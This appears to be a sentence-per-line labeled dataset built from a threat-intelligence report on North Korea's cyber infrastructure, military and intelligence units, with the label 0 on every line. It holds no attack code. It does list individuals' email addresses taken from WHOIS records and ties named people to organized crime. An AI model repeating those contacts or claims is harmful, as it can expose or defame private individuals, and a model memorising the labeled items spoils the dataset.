 North Korea 's Internet infrastructure and the regime 's strict control over its use ensures that there are no rogue actors and that all officially sanctioned actors exercise careful OPSEC and PERSEC practices in order to prevent inadvertent information leaks .	0
In other words , there was no significant identifying information in the form of an OSINT trail left behind by the actors .	0
This hinders collection of original , actionable threat intelligence and individual actor attribution .	0
 North Korea is well-isolated from the outside world , and its strong intelligence and psychological operations presence effectively creates confusion via counterintelligence and disinformation about the regime 's capabilities .	0
For this reason , any '' official '' reports emanating from North Korea must be taken with a grain of salt .	0
This also hinders attempts to obtain original , actionable threat intelligence .	0
In order for Westerners to understand the North Korean mindset , it is necessary to examine the key components of North Korean political and ideological thought .	0
It is also necessary to provide a brief explanation of how North Korea and South Korea view one another , in order to understand the basis for conflict between the two .	0
North Korea has two primary ideologies that provide context for the regime 's motivations and activities : juche ( ju-cheh ) and songun ( sun-goon ) .	0
Juche is the official political ideology of North Korea .	0
It was instituted in 1972 and is based on the ideologies of Kim Il-Sung , the founder of the DPRK .	0
Juche emphasizes self-reliance , mastering revolution and reconstruction in one 's own country , being independent of others , displaying one 's strengths , defending oneself , and taking responsibility for solving one 's own problems .	0
North Korea 's air-gapped intranet , described below , exemplifies this philosophy in the country 's cyber infrastructure .	0
The juche philosophy explains North Korea 's disdain for outside cultural and political influence .	0
Juche challenges North Koreans to contribute to the regime 's chaju ( ja-ju ) , a concept of national sovereignty and independence .	0
The regime 's greatest fear is internal dissent and resulting destabilization .	0
In a June 2014 Reddit AMA session , Dr. Andrei Lankov , an expert on North Korean culture and society , noted '' there are also serious signs of public alienation and discontent .	0
And I can not rule out a public outbreak of such discontent in the near future .	0
Of course , if it happens , it will have a serious impact on the government .	0
'' Despite North Korea 's strong conviction in juche , the regime collaborates with and receives support from other nations .	0
However , due to this deep-seated ideology , it is doubtful that North Korea fully trusts these apparent allies .	0
Later in this document , we will show that North Korea relies heavily on China for Internet access .	0
North Korea also collaborates with China and Russia to train its cyber warriors and has longstanding political and military relationships with several nations .	0
Songun is North Korea 's '' military first '' doctrine .	0
Songun emphasizes the priority of the military in resource allocation and political and economic affairs .	0
This doctrine stems from the belief that the military is vital for preservation of chaju .	0
Understanding songun mindset gives context for this potential threat actor 's motivations .	0
According to a 2013 Congressional report , the strategy established under former leader Kim Jong-Il focused on '' internal security , coercive diplomacy to compel acceptance of its diplomatic , economic and security interests , development of strategic military capabilities to deter external attack , and challenging South Korea and the U.S.-South Korean alliance .	0
'' North Korea 's songun permeates the lives of all North Korean citizens .	0
Article 58 of the North Korean Constitution states that the nation should base itself on a nationwide defense system that includes all people .	0
North Korea , with a population of 25 million , has an active duty force of 1.19 million personnel , the fourth largest in the world .	0
The country 's reserve and paramilitary units comprise 7.7 million additional personnel .	0
In other words , over a third of the country's population serves in a military or paramilitary capacity .	0
Some North Korean youth aged 7-13 are inducted into the Korean Children 's Union .	0
The Korean Children 's Union is responsible for indoctrinating youths who pledge to build up their strength to later defend the regime .	0
Children aged 14-16 can begin military training as members of the Young Red Guards , a paramilitary unit .	0
Beginning at age 17 , North Koreans are eligible to join the Reserve Military Training Unit .	0
The Reserve Military Training Unit forms the core of North Korea 's reserves and is typically assigned to the front or regional defense in wartime .	0
The youngest age at which a citizen can be conscripted for active duty is unclear ; reported ages range from 18-20 .	0
Youths can volunteer for active duty service at age 16 or 17 .	0
The Worker-Peasant Militia , or Red Guards , includes males ages 17-60 and unmarried females ages 17-30 who are not part of active duty units or the Reserve Military Training Unit .	0
The regime has an impressive number of conventional weapons , considering the nation 's small land area and population size .	0
According to statistics released by CNN in 2014 , North Korea's ground arsenal includes 4100 tanks , 2100 armored vehicles , and 8500 pieces of field artillery .	0
The regime 's sea weaponry includes 70 submarines , 420 patrol combatants , and 260 amphibious landing craft .	0
Their airpower includes 730 combat aircraft , 300 helicopters , and 290 transport aircraft .	0
While the limits of the regime 's ballistic missile program are unknown , North Korea is thought to have fewer than 100 short-range missiles and fewer than 100 medium to long-range missiles .	0
However , in recent years , North Korea has suffered oil , fuel , electricity , and food shortages .	0
Without aid from another entity , the regime does not have sufficient resources to maintain and sustain the majority of its weapons and associated personnel for rapid deployment or prolonged combat .	0
Tension between North and South Korea has continued well past the armistice meant to end the Korean War .	0
Neither nation recognizes the other as a legitimate state .	0
South Korea 's constitution legally defines South Korean territory as the entire Korean peninsula and its adjacent islands , with '' North Korea '' being a part of South Korea .	0
North Korea also claims to be the sole government of the Korean Peninsula .	0
Each country 's claim of sovereignty and refusal to acknowledge the other as a legitimate state creates the condition for perpetual conflict .	0
North Korea 's negative sentiment towards the U.S. stems from two major factors : the U.S. – South Korea military alliance and North Korea 's perception that the U.S. is imperialistic and prone to exploitative capitalism .	0
In recent years , two primary factors have heavily influenced the current state of North Korea's relations with South Korea and her allies : the rise of the regime 's leader Kim Jong Un and the inauguration of South Korean president Park Guen Hye .	0
Kim Jong Un officially rose to power in April 2012 , following the death of his father Kim Jong Il in December 2011 .	0
While his age remained a mystery for quite some time , it was later revealed that he was born in January 1983 , making him age 31 at present .	0
This makes Kim Jong Un the world 's youngest leader of an established nation .	0
The young leader 's rise to power brought about several changes in North Korea .	0
First , Kim Jong Un 's personal life is more public and more extravagant than that of his father .	0
Unlike his father , the young Kim is often accompanied by his wife when making public appearances .	0
Second , the young Kim , who is more high-tech than his predecessor , is reported to have an affinity for luxury items and is an avid gamer and basketball fan .	0
Third , Kim Jong Un is more totalitarian than his father .	0
Following his rise to power , the regime reportedly expanded its labor camps , and more military resources were allocated to target those attempting to defect .	0
Kim also executed his own uncle , a high-ranking official who did not share his ideals .	0
These moves indicate the regime 's priority to deter internal destabilization and dissent , which is perceived to be a greater threat than outside adversity .	0
According to Phil Robertson , deputy Asia director at Human Rights Watch , '' The government now recognizes that the accounts of escaping North Koreans reveal Pyongyang 's crimes – so it is doing what it can to stop people from fleeing .	0
'' Under Kim Jong Un 's rule , the regime has stepped up its nuclear materials production , and the propaganda distributed by state media has become more menacing .	0
The regime 's response to perceived threats has also become more volatile .	0
Christian Whiton , a former deputy envoy to North Korea , noted that following Kim Jong Un 's rise to power , '' the regime still acts in a very belligerent manner , but it seems less predictable , and more random .	0
'' Ellen Kim , assistant director of the Korea Chair at the Center for Strategic and International Studies , assessed the situation thusly : '' Since [ Kim Jong Un ] took power he has purged almost all of his elder guardians ...	0
and filled his surroundings with new faces .	0
We are in a situation where we are learning about him a little bit every day through his unpredictable behavior and actions , which is why the current situation with North Korea is a lot more dangerous than before .	0
'' The regime's recent reaction to an upcoming film supports these statements .	0
The plot for the comedy film '' The Interview '' follows two talk show hosts who are asked to assassinate Kim Jong Un .	0
The regime even sent a complaint about the movie to the UN .	0
In response to the film , a North Korean official stated , '' The enemies have gone beyond the tolerance limit in their despicable moves to dare hurt the dignity of the supreme leadership .	0
'' The official referred to the movie as '' the most undisguised terrorism and a war action to deprive the service personnel and people of the DPRK of their mental mainstay and bring down its social system .	0
'' The official also issued a threat : '' If the U.S. administration connives at and patronizes the screening of the film , it will invite a strong and merciless countermeasure .	0
'' This reaction demonstrates North Korea 's priority of preserving the regime 's self-perceived dignity in the global arena and its intolerance of any disrespect directed at the Kim family .	0
While tensions between North and South Korea have persisted since the Korean War , these tensions escalated following the 2013 inauguration of South Korea 's current president , Park Geun Hye .	0
Her platform , in her words , is as follows : '' North Korea must keep its agreements made with South Korea and the international community to establish a minimum level of trust , and second there must be assured consequences for actions that breach the peace .	0
To ensure stability , trustpolitik should be applied consistently from issue to issue based on verifiable actions , and steps should not be taken for mere political expediency .	0
'' Shortly after Park 's inauguration , North Korea denounced UN Security Council Resolution 2094 , which is '' a resolution strengthening and expanding the scope of United Nations sanctions against the Democratic People 's Republic of Korea by targeting the illicit activities of diplomatic personnel , transfers of bulk cash , and the country 's banking relationships , in response to that country 's third nuclear test on 12 February [ 2013 ] .	0
'' North Korea also responded strongly to joint U.S.-South Korea military exercises in March 2013 , as is noted later in this paper .	0
North Korea 's cyber infrastructure is divided into two major parts : an outward-facing Internet connection and a regime-controlled intranet .	0
North Korea 's outward-facing Internet connection is only available to select individuals and is closely monitored for any activity that is deemed anti- regime .	0
Individuals using the outward-facing Internet connection must be authorized .	0
In 2013 , Jean H. Lee , the Associated Press bureau chief in Pyongyang , stated that foreigners visiting North Korea are allowed Internet access with no firewalls .	0
Common citizens are limited to using the Kwangmyong ( gwang me-young ) , a nationwide intranet with no access to the world outside North Korea .	0
According to Lee , Kwangmyong allows citizens '' access to the state media , information sources that are vetted by the government , and picked and pulled from the Internet and posted to their intranet site .	0
'' As of May 2013 , North Korea had only one '' Internet café .	0
'' A 2003 report from the Office of the National Counterintelligence Executive stated that North Korea 's '' Internet café '' was '' the only place in North Korea for the public to access the Internet '' and that foreigners were allowed to access the Internet from this café .	0
Whether citizens are allowed to access the Internet from this location is unknown .	0
Star Joint Venture Co. is responsible for providing North Korea 's Internet access .	0
Star Joint Venture Co. was established by the Post and Telecommunications Corporation in cooperation with Loxley Pacific in Thailand .	0
In December 2009 , Star Joint Venture became responsible for North Korea's Internet address allocation .	0
Previously , Internet access was provided by a German satellite link via Korea Computer Center Europe or via direct connections with China Netcom , which was later merged into China Unicom .	0
By October 2010 , North Korea had made its first known direct connection to the Internet , hosting an outward-facing Korean Central News Agency website accessible from the global Internet .	0
However , many of North Korea 's globally accessible websites are hosted in other countries .	0
In 2001 , South Korean reports indicated that North Korea had joined the International Telecommunications Satellite Organization ( INTELSAT ) .	0
As of April 2012 , North Korea reportedly used the Intelsat connection , which appeared in border gateway protocol ( BGP ) announcements .	0
Some reports referred to the Intelsat connection as North Korea 's backup Internet connection , in case the China Unicom connection fails .	0
A March 2013 post on the blog rdns.im showed that North Korea no longer used the Intelsat connection .	0
In the blog post , the author noted his method for proving that The Pirate Bay was not hosted in North Korea .	0
While his analysis of The Pirate Bay 's hosting is irrelevant to our research , he did detail that 175.45.177.0/24 always routes through AS4837 , and AS131279 .	0
AS131279 is Star-KP , North Korea 's Star Joint Venture Company , and AS4837 is China Unicom .	0
The author concluded that '' all [ traffic ] is ONLY routed through China Unicom and NOT through Intelsat .	0
'' In February 2014 , North Korean and South Korean officials agreed to extend Internet access to Kaesong Industrial Zone , a jointly operated industrial complex just north of the border .	0
However , this would likely require a major electrical and network infrastructure expansion .	0
North Korea 's electrical grid can not support a large technological infrastructure .	0
Electrical power is reported to be unreliable and sporadic , with many citizens only receiving a few hours of electricity per day .	0
The photo above ( Figure 3 ) , from the International Space Station , shows North Korea 's sparse power grid , in comparison with surrounding nations .	0
We have highlighted North Korea in red .	0
Koryolink , the country 's only cellular phone network , is tightly controlled by the regime .	0
Cell phone data plans are not available to most users .	0
Most cellular phones can not access the Internet and can only make domestic calls .	0
According to a 2013 report , North Korea has a 3G data network for cellular phones .	0
Visiting reporter Jean H. Lee purportedly used this 3G network to post to both Twitter and Instagram .	0
However , citizens are not generally allowed to use the 3G network .	0
Email is also regulated by the regime .	0
The first email provider in North Korea was Silibank .	0
Silibank has servers in Pyongyong and Shenyang and is a joint venture with China .	0
The North Korean Silibank homepage is silibank.net , and the Chinese homepage is silibank.com .	0
In order to use the email service , users had to initially register , provide personal information , and pay a registration fee and monthly service fees .	0
This registration information was current as of 2001 .	0
However , it is unknown whether the same process still applies .	0
WHOIS records for silibank.net show that the site was registered anonymously via a Japanese registrar .	0
This information can be found in Appendix A at the end of this paper .	0
Korea Computer Center ( KCC ) is North Korea 's leading government research center for information technology .	0
KCC has eleven regional information centers and eight development and production centers .	0
Other countries with KCC branch offices include China , Syria , Germany , and United Arab Emirates .	0
KCC has a vested interest in Linux research and is responsible for the development of North Korea 's national operating system , Red Star OS , which is discussed in more detail below .	0
KCC 's other projects have included a proprietary search engine , a document writer , a game called Jang-Gi , the Kwangmyong intranet , a food study program , a Korean input method editor , a pen-based English-Korean and Korean-English translator , Korean voice recognition software , a video conferencing system , a distance education system , SilverStar Paduk software , HMS Player , and the Samjiyon tablet .	0
In addition to research and development , KCC also monitors websites of foreign government and business entities and conducts technical reconnaissance to blueprint the technical specifications and vulnerabilities in foreign systems and technologies .	0
KCC has also been involved in clandestine information and cyber operations , serving as a command center .	0
North Korea 's proprietary operating system is Red Star OS .	0
The development of this Linux-based operating system started in 2002 .	0
Red Star OS is only offered in the Korean language and features proprietary software including Naenara ( a Firefox-based browser ) , as well as a text editor , email client , audio and video players , and games .	0
Red Star OS 's keyboard layouts include Korean , English , Russian , Chinese , and Japanese .	0
Regime ideals extend to Red Star OS .	0
The readme file , which goes with the installation disc , reportedly includes a quote from Kim Jong-Il regarding the importance of North Korea having its own Linux-based operating system that is compatible with Korean traditions .	0
While prior versions of Red Star were KDE-based , version 3.0 mimics Apple 's OS X .	0
This could indicate the regime leader Kim Jong Un 's preference for the OS X environment , as Kim reportedly uses an iMac .	0
Citizens do not need permission to obtain Red Star OS .	0
However , the purchase of computers is heavily regulated .	0
The OS 's design suggests it was developed with means for the regime to monitor user activity .	0
North Korea is known to use two IP ranges .	0
175.45.176.0/22 is North Korea 's own IP block .	0
Additionally , North Korea 's Telecommunications Ministry is the registered user of China Unicom IP range 210.52.109.0/24 .	0
The country 's only autonomous system ( AS ) number is AS131279 , and its only peer is AS4837 , the AS for China Unicom .	0
North Korea 's country code top-level domain ( ccTLD ) is .kp	0
.	0
In 2007 , the .kp	0
TLD was initially delegated to and administered by the German-based KCC Europe .	0
After KCC Europe failed to maintain the TLD , it was re-delegated to Star Joint Venture Company .	0
The .kp	0
TLD uses the following nameservers and IP addresses : Various U.S. , U.N , and other sanctions prohibit export of dual-use technologies to North Korea .	0
In light of this , North Korea has managed to develop both hardware and software and hosts an annual National Exhibition of Invention and New Technologies to promote its products .	0
However , the regime has historically failed in its attempts at large-scale production of electronic components .	0
The country 's sparse electrical grid is one of the major obstacles hindering large- scale manufacturing .	0
Additionally , the famine in the early 1990 's negatively impacted existing manufacturing facilities , and the regime simply does not have the capital to modernize those factories .	0
A member of the World International Property Organization ( WIPO ) , North Korea joined the WIPO Patent Cooperation Treaty that protects patents and trademarks worldwide , and leverages intellectual property laws to ensure Westerners do not take credit for North Korean inventions .	0
The regime , in its efforts to isolate its citizens from Western influence , leverages intellectual property laws to ensure Westerners do not take credit for North Korean inventions .	0
This is ironic since foreign-made electronic components are sometimes smuggled into North Korea for military use and for personal use by the regime 's upper echelon .	0
A comparison of a scan of North Korea 's IP ranges in November 2010 , just one month after North Korea made its first direct connection to the Internet , and a series of several scans we conducted in May 2014 , shows that North Korea has made significant headway in establishing its Internet presence .	0
In the November 2010 scan , 175.45.176.0 - 175.45.176.16 showed a variety of devices including D-link , Cisco , Linksys , HP , and Nokia devices , and a Juniper networks firewall .	0
Operating systems detected included FreeBSD 6.x , Linux 2.6.x , and Red Hat Enterprise Linux .	0
175.45.176.14 returned '' Naenara '' as an html-title .	0
Most hosts in the 175.45.176.xx and 175.45.177.xx ranges were down .	0
As of 2014 , IP addresses 175.45.176.0 - 175.45.177.255 appear to be used for websites , nameservers , databases , email , and voice over IP ( VoIP ) .	0
In November 2010 , the 175.45.178.xx range showed all hosts down , and the 175.45.179.xx range showed most hosts were down .	0
In 2014 , several webservers and nameservers were found in the 175.45.178.xx range , and several nameservers and mail servers were found in the 175.45.179.xx range .	0
This comparison demonstrates that there has been some growth in DPRK Internet infrastructure over the past four years .	0
However , it seemingly lags behind even most third world nations .	0
The 2014 scans detected dated technology that is potentially susceptible to multiple vulnerabilities and consistently showed the same open ports and active devices on scanned hosts .	0
It is not clear whether the regime failed to notice and react to the scanning or whether the regime allows these open ports and devices to be detected or spoofed to serve as a distraction or possible honeypot .	0
Domains , nameservers , and mail servers present during the May 2014 scan are listed in Appendix B at the end of this report .	0
According to Alexa rankings , the three most visited websites in North Korea are kcna.kp , the official website of the Korean Central News Agency ( KCNA ) ; rodong.rep.kp , another North Korean news site ; and naenara.com.kp , North Korea 's official web portal .	0
Naenara translates to '' my country '' .	0
The kcna.kp site was registered using a Loxley.co.th email address and is administrated by Star Joint Venture Company .	0
The WHOIS Record can be found in Appendix A. Rodong.rep.kp was registered using the same loxley.co.th email address and is also administered by Star Joint Venture Company .	0
The WHOIS Record for this site can be found in Appendix A .	0
The WHOIS information for Naenara.com.kp was not available .	0
In March 2013 , there were reports that the Chrome browser was blocking Naenara.com.kp due to malware .	0
It is difficult to say whether this incident is a case of North Korea serving malware or whether a third party took advantage of an improperly secured website .	0
Several major North Korean websites are hosted outside of North Korea .	0
The popular Uriminzokkiri.com website , whose name translates to '' our nation , '' is hosted in China .	0
The administrative contact for the website is Kim Sejun , and the email address given as contact information is hyk1979 @ hotmail.com .	0
The WHOIS Record for this site can be found in Appendix A .	0
The website for Kim Il Sung Open University , otherwise known as '' Our Nation School '' is also hosted in China .	0
The WHOIS record for this site can be found in Appendix A .	0
At the top of North Korea 's military structure is the National Defense Commission ( NDC ) .	0
The NDC is also the highest branch of government and the regime 's supreme policymaking body .	0
Along with the Central Committee of the Workers ' Party of Korea and the Cabinet , NDC is at the top of North Korea 's political hierarchy .	0
Article 106 of North Korea 's Constitution gives the NDC the following powers :  The power to establish policies of the state in accordance with the military-first revolutionary line .	0
 The power to guide the armed forces and oversee defense building .	0
 The power to supervise and ensure the NDC and its chairman 's orders are executed and to establish necessary measures .	0
 The power to override any state decisions or directives that are in opposition to the NDC or its chairman 's decisions and directives .	0
 The power to create or remove central organs of the national defense sector .	0
 The power to create and bestow military titles above general-grade officer rank .	0
The NDC oversees several defense and intelligence bodies including the Ministry of State Security , the Ministry of People 's Security , the Ministry of People 's Armed Forces , and the Korean People's Army .	0
The Ministry of State Security ( MSS ) , also known as the State Security Department , is North Korea 's primary counterintelligence service .	0
It is considered an autonomous agent of the regime and reports directly to leader Kim Jong Un .	0
The MSS 's duties include oversight of North Korean prison camps , investigation of domestic espionage , repatriation of defectors , and overseas counterespionage operations .	0
The Ministry of People 's Security is also known as the Ministry of Public Security ( MPS ) .	0
Focused on domestic order , it oversees North Korea 's national police force , conducts criminal investigations and preliminary examinations , and oversees correctional facilities , excluding prison camps .	0
While the roles of the MSS and MPS focus more on intelligence than on cyber operations , the MSS also reportedly has a communications monitoring and computer hacking group .	0
The Ministry of People 's Armed Forces ( MPAF ) administrates the Korean People 's Army ( KPA ) and oversees the General Staff Department ( GSD ) , which is responsible for operational command and control of North Korea 's armed forces .	0
The General Staff Department also oversees the Reconnaissance General Bureau ( RGB ) , North Korea 's agency for clandestine operations .	0
The RGB has a role in both traditional and cyber operations .	0
In the past , the RGB has sent agents on overseas military assistance missions to train insurgent groups .	0
The RGB reportedly has a special operations forces ( SOF ) element and oversees six bureaus that specialize in operations , reconnaissance , technology and cyber matters , overseas intelligence collection , inter-Korean talks , and service support .	0
Two of these bureaus have been identified as the No .	0
91 Office and Unit 121 .	0
The No .	0
91 Office , an office responsible for hacking , operates out of the Mangkyungdae-district of Pyongyang .	0
Unit 121 comprises both an intelligence component and an attack component .	0
Unit 121 's headquarters is in the Moonshin-dong area of Pyongyang , near the Taedong River .	0
It also has components that conduct operations from within China .	0
One of Unit 121 's command posts is Chilbosan Hotel in Shenyang , the capital of Liaoning Province , which borders North Korea .	0
Shenyang is a Chinese military district .	0
According to Dr. Alexandre Mansourov , an expert on North Korea and a visiting scholar at the U.S.-Korea Institute at Johns Hopkins University , '' They [ Unit 121 ] are believed to have conducted hacking operations from inside China that falsify classified data and disrupt U.S. and South Korean systems .	0
'' Both Unit 121 and an entity known as Lab 110 are reported to maintain technical reconnaissance teams responsible for infiltrating computer networks , hacking to obtain intelligence , and planting viruses on enemy networks .	0
Several entities are nested under the Workers ' Party .	0
The Central Party Committee oversees the Central Party Investigative Group , also known as Unit 35 .	0
Unit 35 is reportedly responsible for technical education and training of cyber warriors .	0
The Unification Bureau 's Operations Department is responsible for cyber-psychological warfare , organizational espionage , and oversight of Unit 204 .	0
Unit 204 's responsibilities include planning and execution of cyber-psychological warfare operations and technological research .	0
The Psychological Operations Department of the North Korea Defense Commission also engages in cyber-psychological warfare .	0
The 225th Bureau , or Office 225 , is responsible for training agents , infiltration operations in South Korea , and creation of underground political parties in order to incite disorder and revolution .	0
It plays a more traditional intelligence and psychological operations role , rather than focusing on cyber operations .	0
The United Front Department ( UFD ) conducts overt operations to create pro-North Korean groups in South Korea .	0
Examples of this activity include the Korean Asia-Pacific Committee and the Ethnic Reconciliation Council .	0
The UFD also manages inter-Korean dialogue and North Korea's policy toward South Korea .	0
Its operations are also more traditional rather than cyber-focused .	0
The Liaison Department of the Worker 's Party oversees a faction of ethnic North Koreans residing in Japan who are critical to North Korea 's cyber and intelligence programs .	0
This group , which was established in 1955 , is referred to by various names including the Chosen Soren , Chongryon , and the General Association of Korean Residents in Japan .	0
The Chongryon ascribe to juche and seek to preserve North Korean culture while living in Japan .	0
They operate North Korean style schools and refuse to assimilate with Japanese culture .	0
According to Mitsuhiro Suganuma , former section head of the second intelligence department of the Japanese Public Security Intelligence Agency ( PSIA ) , '' Chongryon is virtually under the direct control of the Liaison Department of the Workers ' Party of Korea , which has been in charge of North Korea 's covert operations and underground activities against South Korea .	0
Chongryon in Japan has been a strong support organization aimed at bringing a revolution in South Korea , or a red unification by force .	0
'' He also stated '' North Korea will continue to make Chongryon serve as Pyongyang 's pawn in covert operations against South Korea .	0
'' The Chongryon are vital to North Korea 's military budget , raising funds via weapons trafficking , drug trafficking , and other black market activities .	0
The group also forms '' front companies '' abroad that benefit the regime by generating hard currency .	0
One example is Unikotech , which was formed to sell KCC products abroad .	0
The Chongryon 's underground group known as the Gakushu-gumi , or '' the study group '' , gathers intelligence for North Korea and helps the regime procure advanced technologies .	0
The Chongryon 's role in North Korean intelligence and resource acquisition is discussed below in more detail .	0
The regime also has several government bodies under the Cabinet that oversee its infrastructure , intelligence , and technological development .	0
These include the Central Scientific and Technological Information Agency ( CSTIA ) , the Ministry of Electronics Industry , and the Ministry of Posts and Telecommunications .	0
The CSTIA collects , analyzes , and processes data regarding advanced science and technology then sends relevant information to appropriate areas of the national economy .	0
The amount of information contained in CSTIA's technical database makes it North Korea 's largest scientific facility .	0
According to a CIA article , review of CSTIA 's publications showed that China , Russia , and Japan are important sources of technical data .	0
CSTIA 's publications include newsletters and an 18-volume science and technology reference series .	0
The Ministry of Posts and Telecommunications is the body of oversight for Star Joint Venture Co. North Korea 's cyber warfare doctrine has not been clearly stated .	0
However , based on cultural and technical observations , we may deduce that North Korea 's cyber doctrine follows the tenets of juche nationalism and the songun doctrine .	0
Although North Korea 's limited online presence makes a thorough analysis of their cyber warfare capabilities a difficult task , it must be noted that what is known of those capabilities closely mirrors their kinetic warfare tactics .	0
Cyber warfare is simply the modern chapter in North Korea's long history of asymmetrical warfare .	0
North Korea has used various unconventional tactics in the past , such as guerilla warfare , strategic use of terrain , and psychological operations .	0
The regime also aspires to create viable nuclear weapons .	0
Asymmetrical warfare is defined as '' a conflict in which the resources of two belligerents differ in essence and in the struggle , interact and attempt to exploit each other 's characteristic weaknesses .	0
Such struggles often involve strategies and tactics of unconventional warfare , the 'weaker ' combatants attempting to use strategy to offset deficiencies in quantity or quality '' .	0
According to the aforementioned report to the House Armed Service Committee , '' Cyber warfare is an important asymmetric dimension of conflict that North Korea will probably continue to emphasize - in part because of its deniability and low relative costs .	0
'' North Korea 's poor economic state , further explains the regime 's reliance on these tactics .	0
In 2014 , the regime reportedly spent 16 % of its budget on defense .	0
The North Korean military places a strong emphasis on information warfare capabilities including political and psychological warfare and cyber or hacker warfare .	0
The report by Capt .	0
Duk-Ki Kim , Ph.D. highlighted North Korea 's counter-asymmetric strategy and ranked each based on intensity and frequency : Just ten years ago , experts noted that North Korea was one of the '' least network-ready and most isolated societies on the planet .	0
'' Today North Korea 's air-gapped networks and prioritization of resources for military use provide both a secure and structured base of operations for cyber operations and a secure means of communications .	0
North Korea 's hermit infrastructure creates a cyber-terrain that deters reconnaissance .	0
Because North Korea has few Internet connections to the outside world , anyone seeking intelligence on North Korea 's networks has to expend more resources for cyber reconnaissance .	0
A 2003 article by the U.S. Office of the National Counterintelligence Executive assessed that '' Development of the nation , rather than empowerment of the individual , appears to be driving DPRK efforts to develop domestic IT infrastructure and industry .	0
'' In November 2013 , Kim Jong Un referred to cyber warfare capabilities as a '' magic weapon '' in conjunction with nuclear weapons and missiles .	0
According to Kim Heung-kwang , a North Korean defector and former computer science professor , the regime has the following motivations for expanding its cyber warfare capabilities :  Cyber capabilities are a cost-effective way to offset North Korea 's lack of kinetic military prowess .	0
 North Korea 's school systems place a strong emphasis on math , giving the nation confidence in its programmers , cryptographers , and security researchers .	0
 In the modern warfare landscape , cyber capabilities are potentially more utilitarian than heavy artillery or aircraft .	0
 Cyber warfare capabilities provide a platform for espionage , psychological operations , and other forms of non-kinetic warfare .	0
 Considering the separatist nature of North Korea 's infrastructure , cyber warfare provides a strategic advantage since outbound attacks are possible , but inbound attacks would have limited reach .	0
 Cyber warfare allows North Korea to leverage the Internet 's inherent flaws for offensive purposes while maintaining its defenses , primarily via air-gapping its most critical networks from the outside world .	0
North Korea 's attack and defense capabilities reportedly include the following cyber warfare and electronic warfare components : offensive cyber operations ( OCO ) ; computer network operations ( CNO ) , which includes both computer network attack ( CNA ) and computer network exploitation ( CNE ) ; distributed denial of service ( DDoS ) ; satellite monitoring ; drones ; GPS jamming capabilities ; and deployment of electromagnetic pulse ( EMP ) .	0
North Korea 's OCO and CNO capabilities became apparent as early as 2004 , when North Korea reportedly gained access to 33 of 80 South Korean military wireless communication networks .	0
In June 2006 , an attack on the U.S. State Department originating in the East Asia-Pacific region coincided with U.S.-North Korea negotiations over the regime 's nuclear missile testing .	0
A month later , a South Korean military report implicated North Korea 's Unit 121 in hacking the South Korean and U.S. Defense Departments .	0
North Korea also tested a logic bomb in October 2007 .	0
A logic bomb is malicious code programmed to execute based on a pre-defined triggering event .	0
Following the logic bomb test , the UN passed a resolution banning sales of certain computer hardware to North Korea .	0
North Korea considers its cyber warfare capabilities an important asymmetric asset in the face of its perceived enemies , the U.S. and South Korea .	0
While North Korea does not have an immersive digital culture , both the U.S. and South Korea are heavily dependent upon technological infrastructure for social , economic , and political stability .	0
For this reason , a cyber attack that cripples or compromises the reliability of the U.S. or South Korea 's technological infrastructure could have a far-reaching impact .	0
North Korea has reportedly used computer games for both illegal capital gain and orchestrating cyber attacks .	0
In 2011 , South Korean police arrested five individuals , including one Chinese national , for allegedly collaborating with North Korean hackers affiliated with the Korea Computer Center to steal money via online games .	0
According to South Korean reports , the culprits used an auto-player to quickly progress in the massively multiplayer online role-playing game ( MMORPG ) '' Lineage '' and were able to use the game 's market to obtain real currency .	0
In 2013 , South Korean officials released information stating they had found evidence that North Korea was using games as a medium for infecting machines and launching cyber attacks .	0
North Korea had used game downloads to infect 100,000 South Korean machines for a botnet used to launch a distributed denial of service ( DDoS ) attack against Incheon Airport .	0
This clever tactic sought to leverage a seemingly innocent game as a force multiplier in order to amplify the effects of a DDoS attack on a critical infrastructure target .	0
However , in this case , there was little impact on the target .	0
North Korea 's intelligence program is one of its strongest military assets , providing foundational support for all other military operations .	0
The regime 's cyber warfare capabilities , in particular , rely heavily on open-source intelligence ( OSINT ) collection and cyber-espionage .	0
As noted in a CIA publication , '' It is a significant irony of our information age that open-source intelligence is contributing to the survival and development of one of the world 's most secretive regimes .	0
'' Historically , the primary goals of the regime 's intelligence program included collection and dissemination of intelligence concerning any possible political , military , or economic threat to the regime 's security and stability .	0
Secondary goals have included '' acquisition of foreign military and civilian technologies and equipment , support of the DPRK 's foreign policy goals , training and support for foreign revolutionary and terrorist organizations , and the acquisition of foreign capital for state and intelligence operations .	0
'' North Korea has a broad reach for intelligence collection , which extends to cyber intelligence .	0
In April 2013 , Solutionary , a company providing managed security services , reported a marked increase in both overt attacks and information gathering attempts originating from North Korean IPs .	0
Solutionary refers to any overt external attacks on company networks or attempts to steal data as '' touches .	0
'' They reportedly recorded 12,473 of these touches in February 2013 , 11,000 of which were directed at a single financial institution .	0
As a baseline , Solutionary noted that typically only 200 incidents per month are traced to North Korean origin .	0
This is an interesting claim , considering that attacks attributed to North Korea are usually routed through other countries .	0
As mentioned above , a faction of ethnic North Koreans residing in Japan , known as the Chongryon , are critical to North Korea 's cyber and intelligence programs and help generate hard currency for the regime .	0
The Chongryon headquarters has been recognized as the de facto North Korean embassy in Japan .	0
In 2012 , the organization 's headquarters was seized to pay for the group's past due debts .	0
It was then purchased by a monk named Ekan Ikeguchi , who let the Chongryon continue to use the building in what he referred to as a '' goodwill gesture '' .	0
Ikeguchi is one of the Chongryon's many ties to organized crime .	0
Ikeguchi was arrested in the past for an attempted coup against the Japanese government .	0
He also has ties to the political group Nihon Seinensya , which is involved in illegal activities in conjunction with the yakuza syndicate Sumiyoshi-kai , which imports and sells amphetamines made in North Korea .	0
North Korea also has black market ties to Sumiyoshi-kai's rival syndicate , Yamaguchi-gumi .	0
Many members of the Kodo-kai , Yamaguchi-gumi 's ruling faction , are Korean-Japanese , with ties to North Korea .	0
Masahiro Namikawa , leader of the drug trafficking Seido-kai yakuza organization , also has ties to the Chongryon .	0
The Chongryon operate at least two websites , chongryon.com , which is in Japanese , and korea- np.co.jp .	0
WHOIS records for chongryon.com indicate that it was registered by '' guanin o '' using the email address park2 @ mac.com .	0
The WHOIS information for korea-np.co.jp .	0
shows that it was registered by Choson Shinbo Company Inc .	0
The WHOIS records for these sites can be found in Appendix A. Additionally , the Chongryon operate a ferry called the Mangyongbong-92 , the only direct transit from Japan to North Korea .	0
In 2003 , they were suspected of using the ferry to smuggle missile parts .	0
In 2006 , the ferry was temporarily banned from Japanese waters when Japanese officials discovered the Chongryon were using it to smuggle dual-use electronics to North Korea to be used for military purposes .	0
North Korea has a global network of state-run businesses located in 30 to 40 countries that is used for espionage activities .	0
The Reconnaissance General Bureau is responsible for oversight of this network .	0
